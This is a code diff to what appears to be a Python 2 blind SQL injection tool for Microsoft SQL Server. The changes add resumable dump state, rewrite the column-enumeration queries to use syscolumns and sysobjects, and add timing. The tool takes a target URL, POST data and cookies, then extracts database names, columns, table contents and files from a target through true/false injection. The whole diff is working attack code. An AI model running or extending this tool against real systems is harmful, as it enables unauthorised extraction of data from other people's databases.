@@ -7,6 +7,8 @@ import re
 import os
 import sys
 import math
+import time
+import md5
 from threading import Thread
 from Queue import Queue
 from optparse import OptionParser
@@ -231,17 +233,40 @@ class MssqlTrueFalse:
 		else:
 			return request
 
-	def dump(self, request, colonne, begin, end):
+	def dump(self, request, colonne, r_begin, end):
 		dump=[]
-		f = open("dump/" + self.output_dir + "/dumped","a+")
+		m = md5.new()
+		m.update(request)
+		md5_req = m.hexdigest()
+
+
+		if os.path.isfile("dump/" + myInjector.output_dir + "/state_"+md5_req):
+			f=open("dump/" + myInjector.output_dir + "/state_"+md5_req,"r")
+			s_begin, s_end = f.read().split(":")
+			f.close()
+			begin=int(s_begin,10)
+			end=int(s_end,10)
+		else:
+			begin=r_begin
+
+		if r_begin!=1:
+			begin=r_begin
+
+		print begin
+		print end
+
+		f = open("dump/" + self.output_dir + "/dumped_"+md5_req,"a+")
 		f.write(request+"\n")
 		f.close()
-		for i in range(begin,end):
-			f=open("dump/" + self.output_dir + "/state","w")
+		f = open("dump/" + self.output_dir + "/index","a+")
+		f.write(md5_req+" : "+request+"\n")
+		f.close()
+		for i in range(begin,end+1):
+			f=open("dump/" + self.output_dir + "/state_"+md5_req,"w")
 			f.write(str(i)+":"+str(end))
 			f.close()
 			entrie = self.value(request,colonne, i)
-			f=open("dump/" + self.output_dir + "/dumped","a+")
+			f=open("dump/" + self.output_dir + "/dumped_"+md5_req,"a+")
 			f.write("line " + str(i) + " : "+entrie+"\n")
 			f.close()
 			dump.append(entrie)
@@ -286,22 +311,24 @@ class MssqlTrueFalse:
 		return self.dump(request, "name", begin,end)
 
 	def countColumns(self,database,table,condition=""):
-		request=self.conditionRequest("select count(distinct(column_name)) from information_schema.columns where table_schema='"+database+"' and table_name='"+table+"'",condition)
+		#request=self.conditionRequest("select count(distinct(master..syscolumns.name)) as cname from master..syscolumns, master..sysobjects where master..syscolumns.id=master..sysobjects.id and master..sysobjects.name='" + table + "'",condition)
+		request=self.conditionRequest("select count(distinct(name)) from syscolumns where id = (select id from sysobjects where name = '"+ table +"')",condition)
 		return self.count(request)
 
 	def dumpColumns(self, database, table, begin = 1, end = 0, condition=""):
-		request=self.conditionRequest("select distinct(column_name) from information_schema.columns where table_schema='"+database+"' and table_name='"+table+"'",condition)
+		#request=self.conditionRequest("select distinct(master..syscolumns.name) as cname from master..syscolumns, master..sysobjects where master..syscolumns.id=master..sysobjects.id and master..sysobjects.name='" + table + "'",condition)
+		request=self.conditionRequest("select distinct(name) from syscolumns where id = (select id from sysobjects where name = '"+ table +"')",condition)
 		if end==0:
 			end=self.countColumns(database, table, condition)
 		print "There is %d columns in %s.%s with condition : %s"%(end,database,table,condition)
-		return self.dump(request,begin,end)
+		return self.dump(request,"name",begin,end)
 
 	def countEntries(self, database, table, column, condition=""):
-		request=self.conditionRequest("select count(distinct("+column+")) from "+database+"."+table,condition)
+		request=self.conditionRequest("select count(distinct("+column+")) from "+database+".."+table,condition)
 		return self.count(request)
 
 	def dumpEntries(self, database, table, column, begin = 1, end = 0, condition=""):
-		request=self.conditionRequest("select distinct("+column+") from "+database+"."+table,condition)
+		request=self.conditionRequest("select distinct("+column+") from "+database+".."+table,condition)
 		if end==0:
 			end=self.countEntries(database, table, column, condition)
 		print "There is %d entries in %s.%s, column %s with condition : %s"%(end,database,table,column,condition)
@@ -333,22 +360,11 @@ if __name__ == "__main__":
 	if options.modification == "list":
 		print "-m 1 : transform strings with quotes to char(0x) concat"
 		sys.exit()
-
+	a = int(time.time())
 	myInjector = MssqlTrueFalse(options.url, options.post, options.cookie, options.verbose, options.error, options.modification, options.output_dir)
 
-	if os.path.isfile("dump/" + myInjector.output_dir + "/state"):
-		f=open("dump/" + myInjector.output_dir + "/state","r")
-		s_begin, s_end = f.read().split(":")
-		f.close()
-		begin=int(s_begin,10)
-		end=int(s_end,10)
-	else:
-		begin = int(options.begin,10)
-		end = int(options.end,10)
-
-	if options.begin!="1":
-		begin=int(options.begin,10)
-
+	begin = int(options.begin,10)
+	end = int(options.end,10)
 
 	if options.file!="":
 		myInjector.dumpFile(options.file, begin, end)
@@ -364,5 +380,5 @@ if __name__ == "__main__":
 		else:
 			print myInjector.dumpEntries(options.database,options.table,options.colonne, begin, end, options.condition)
 
-
-	print "Done in %d request" %myInjector.getStat()
+	b = int(time.time())
+	print "Done in %d request and %d seconds" %(myInjector.getStat(),(b-a))
